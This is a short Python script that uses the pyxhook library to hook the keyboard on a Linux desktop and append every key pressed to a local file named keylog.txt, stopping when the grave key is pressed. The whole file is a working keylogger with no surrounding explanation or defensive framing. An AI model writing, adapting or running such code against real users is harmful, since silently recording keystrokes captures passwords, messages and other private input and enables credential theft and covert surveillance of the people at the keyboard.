import pyxhook

log_file = 'keylog.txt'


def on_key_press(event):
    fob = open(log_file, 'a')
    fob.write(event.Key)

    # if space, create new line
    if event.Ascii == 32:
        fob.write('\n')

    # if grave key, end script
    if event.Ascii == 96:
        fob.close()
        new_hook.cancel()


new_hook = pyxhook.HookManager()
new_hook.KeyDown = on_key_press
new_hook.HookKeyboard()
new_hook.start()

